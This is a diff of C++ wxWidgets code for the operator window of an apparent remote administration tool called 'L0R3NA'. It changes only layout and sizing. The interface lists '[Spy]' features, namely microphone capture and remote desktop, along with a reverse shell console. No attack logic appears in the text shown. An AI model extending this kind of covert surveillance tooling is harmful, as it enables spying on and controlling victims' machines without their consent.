@@ -27,8 +27,8 @@ wxBEGIN_EVENT_TABLE(panelMicrophone, wxPanel)
 wxEND_EVENT_TABLE()
 
 FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
-    : wxFrame(nullptr, EnumIDS::ID_Panel_Cliente, ":v", wxDefaultPosition, wxDefaultSize, wxDD_DEFAULT_STYLE, strID.substr(0, strID.find('/'))){
-    SetBackgroundColour(wxColour(255, 255, 255, 128)); // Establecer el color de fondo con transparencia
+    : wxFrame(nullptr, EnumIDS::ID_Panel_Cliente, ":v", wxDefaultPosition, wxDefaultSize, wxDEFAULT_FRAME_STYLE, strID.substr(0, strID.find('/'))) {
+
     SetTransparent(245);
 
     this->sckCliente = sckID;
@@ -41,17 +41,12 @@ FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
     strTitle.append("] - Admin");
     this->SetTitle(strTitle);
     
-    wxPanel* pnl_Left = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(200, 450));
-    pnl_Left->SetBackgroundColour(wxColor(255, 0, 0));
-
-    wxPanel* pnl_Right = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(FRAME_CLIENT_SIZE_WIDTH, 450));
-    pnl_Right->SetBackgroundColour(wxColor(0, 255, 0));
+    wxPanel* pnl_Left = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
+    wxPanel* pnl_Right = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
     
-    this->m_tree = new MyTreeCtrl(pnl_Left, EnumIDS::TreeCtrl_ID,
-        wxDefaultPosition, wxSize(200, 450));
-
+    this->m_tree = new MyTreeCtrl(pnl_Left, EnumIDS::TreeCtrl_ID,wxDefaultPosition, wxSize(180, 450));
+    
     wxTreeItemId rootC = this->m_tree->AddRoot(wxT("CLI"));
-    
     wxTreeItemId rootAdmin = this->m_tree->AppendItem(rootC, wxT("[Admin]"));
     wxTreeItemId rootSurveilance = this->m_tree->AppendItem(rootC, wxT("[Spy]"));
     //wxTreeItemId rootMisc = this->m_tree->AppendItem(rootC, wxT("[Misc]"));
@@ -67,14 +62,22 @@ FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
     this->m_tree->AppendItem(rootSurveilance, wxT("Microfono"));
     this->m_tree->AppendItem(rootSurveilance, wxT("Escritorio Remoto"));
 
-    
-    /*this->m_tree->AppendItem(rootMisc, wxT("Testing"));*/
-    
-    this->m_tree->p_Notebook = new wxAuiNotebook(pnl_Right, wxID_ANY, wxDefaultPosition, wxSize(FRAME_CLIENT_SIZE_WIDTH, 450),
+    //Sizer para hacer el treeview dinamico al hacer resize
+    wxBoxSizer* pnl_left_Sizer = new wxBoxSizer(wxHORIZONTAL);
+    pnl_left_Sizer->Add(this->m_tree, 1, wxEXPAND | wxALL, 2);
+    pnl_Left->SetSizer(pnl_left_Sizer);
+    //----------------------------------------------
+
+    this->m_tree->p_Notebook = new wxAuiNotebook(pnl_Right, wxID_ANY, wxDefaultPosition, wxDefaultSize,
         wxAUI_NB_CLOSE_ON_ACTIVE_TAB | wxAUI_NB_DEFAULT_STYLE | wxAUI_NB_TAB_EXTERNAL_MOVE | wxNO_BORDER);
 
+    //Sizer para el notebook del lado derecho
+    wxBoxSizer* pnl_right_Sizer = new wxBoxSizer(wxHORIZONTAL);
+    pnl_right_Sizer->Add(this->m_tree->p_Notebook, 1, wxEXPAND | wxALL, 2);
+    pnl_Right->SetSizer(pnl_right_Sizer);
+    //----------------------------------------------
+
     wxHtmlWindow* html = new wxHtmlWindow(this->m_tree->p_Notebook, wxID_ANY, wxDefaultPosition, wxSize(200, 200));
-    html->SetBackgroundColour(wxColor(0, 0, 255));
     wxString htmlsource = "<center><p>L0R3NA v0.1</p></center>";
     html->SetPage(htmlsource);
     html->SetSize(wxSize(200, 200));
@@ -85,17 +88,22 @@ FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
     
     wxBoxSizer* sizer = new wxBoxSizer(wxHORIZONTAL);
 
-    sizer->Add(pnl_Left, 0, wxALL, 2);
-    sizer->Add(pnl_Right, 1, wxALL, 1);
+    sizer->Add(pnl_Left, 0, wxEXPAND | wxALL, 2);
+    sizer->Add(pnl_Right, 1, wxEXPAND | wxALL, 2);
     
 
     this->SetSizerAndFit(sizer);
 
-    SetClientSize(800, 450);
-    SetSizeHints(820, 485, 820, 485);
+    SetClientSize(700, 450);
 
-    //this->thTransferencias = std::thread(&FrameCliente::MonitorTransferencias, this);
 
+#ifdef DEBUG_DESIGN_LIMITS
+    SetBackgroundColour(wxColour(255, 255, 255, 128)); // Establecer el color de fondo
+    pnl_Left->SetBackgroundColour(wxColor(255, 0, 0));
+    pnl_Right->SetBackgroundColour(wxColor(0, 255, 0));
+    html->SetBackgroundColour(wxColor(0, 0, 255));
+#endif
+    
 }
 
 void FrameCliente::OnClosePage(wxAuiNotebookEvent& event) {
@@ -188,9 +196,13 @@ panelReverseShell::panelReverseShell(wxWindow* pParent) :
             }
         }
     }
-    this->txtConsole = new wxTextCtrl(this, EnumIDS::ID_Panel_Reverse_Shell_TxtConsole, "Reverse Shell v0.1\n", wxDefaultPosition, wxSize(600-5, 410), wxTE_MULTILINE | wxTE_RICH);
+    this->txtConsole = new wxTextCtrl(this, EnumIDS::ID_Panel_Reverse_Shell_TxtConsole, "Reverse Shell v0.1\n", wxDefaultPosition, wxSize(FRAME_CLIENT_SIZE_WIDTH * 3, FRAME_CLIENT_SIZE_WIDTH * 3), wxTE_MULTILINE | wxTE_RICH);
     this->txtConsole->SetForegroundColour(*wxWHITE);
     this->txtConsole->SetBackgroundColour(*wxBLACK);
+
+    wxBoxSizer* sizer = new wxBoxSizer(wxHORIZONTAL);
+    sizer->Add(this->txtConsole, 1, wxEXPAND | wxALL, 2);
+    this->SetSizer(sizer);
 
     Bind(wxEVT_CHAR_HOOK, &panelReverseShell::OnHook, this);
 
